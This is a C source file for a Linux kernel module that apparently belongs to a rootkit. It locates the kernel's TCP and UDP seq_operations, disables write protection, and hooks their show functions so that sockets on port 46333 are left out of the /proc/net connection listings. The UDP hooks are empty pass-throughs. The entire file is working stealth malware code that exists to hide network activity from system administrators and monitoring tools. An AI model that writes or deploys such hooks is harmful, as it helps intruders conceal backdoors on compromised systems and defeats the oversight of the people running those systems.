#include <linux/kernel.h>
#include <linux/seq_file.h>
#include <net/inet_sock.h>
#include <linux/byteorder/generic.h>

#include "common.h"
#include "hook.h"

#define SIZE_PORT_COLON 6

typedef unsigned short port_t;

//TODO add list with [PROTO:PORT] structs
static port_t to_hide = 46333;

static int (*tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*udp4_seq_show)(struct seq_file *seq, void *v);
static int (*tcp6_seq_show)(struct seq_file *seq, void *v);
static int (*udp6_seq_show)(struct seq_file *seq, void *v);

static int g7_tcp4_seq_show(struct seq_file *, void *);
static int g7_tcp6_seq_show(struct seq_file *, void *);
static int g7_udp4_seq_show(struct seq_file *, void *);
static int g7_udp6_seq_show(struct seq_file *, void *);

void
hook_show(void)
{
    tcp4_seq_show 
        = ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show;

    tcp6_seq_show 
        = ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show;

    udp4_seq_show 
        = ((struct seq_operations *)kallsyms_lookup_name("udp_seq_ops"))->show;

    udp6_seq_show 
        = ((struct seq_operations *)kallsyms_lookup_name("udp6_seq_ops"))->show;

    disable_protection();
    ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show
        = (void *)g7_tcp4_seq_show;
    
    ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show
        = (void *)g7_tcp6_seq_show;

    ((struct seq_operations *)kallsyms_lookup_name("udp_seq_ops"))->show
        = (void *)g7_udp4_seq_show;

    ((struct seq_operations *)kallsyms_lookup_name("udp6_seq_ops"))->show
        = (void *)g7_udp6_seq_show;
    enable_protection();    
}

void
unhook_show(void)
{
    disable_protection();
    ((struct seq_operations *)kallsyms_lookup_name("tcp4_seq_ops"))->show
        = (void *)tcp4_seq_show;

    ((struct seq_operations *)kallsyms_lookup_name("tcp6_seq_ops"))->show
        = (void *)tcp6_seq_show;

    ((struct seq_operations *)kallsyms_lookup_name("udp_seq_ops"))->show
        = (void *)udp4_seq_show;

    ((struct seq_operations *)kallsyms_lookup_name("udp6_seq_ops"))->show
        = (void *)udp6_seq_show;
    enable_protection();
}

//seq and v include all the info we need
//https://elixir.bootlin.com/linux/v4.19/source/include/linux/seq_file.h#L16
//https://elixir.bootlin.com/linux/v4.19/source/net/ipv4/tcp_ipv4.c#L2385
static int
g7_tcp4_seq_show(struct seq_file *seq, void *v)
{
    //SEQ_START_TOKEN is used to indicate that a 
    //header will be returned first
    if(v == SEQ_START_TOKEN)
        return tcp4_seq_show(seq, v);

    struct sock *sk = v;
    const struct inet_sock *inet = inet_sk(sk);

    port_t src = ntohs(inet->inet_sport);
    port_t dst = ntohs(inet->inet_dport);

    if(src == to_hide || dst == to_hide)
        return 0;
    
    return tcp4_seq_show(seq, v);
}

//This is basically the same as above
static int
g7_tcp6_seq_show(struct seq_file *seq, void *v)
{
    if(v == SEQ_START_TOKEN)
        return tcp6_seq_show(seq, v);

    struct sock *sk = v;
    const struct inet_sock *inet = inet_sk(sk);

    port_t src = ntohs(inet->inet_sport);
    port_t dst = ntohs(inet->inet_dport);

    if(src == to_hide || dst == to_hide)
        return 0;
    
    return tcp6_seq_show(seq, v);
}

static int
g7_udp4_seq_show(struct seq_file *seq, void *v)
{
    return udp4_seq_show(seq, v);
}

static int
g7_udp6_seq_show(struct seq_file *seq, void *v)
{
    return udp6_seq_show(seq, v);
}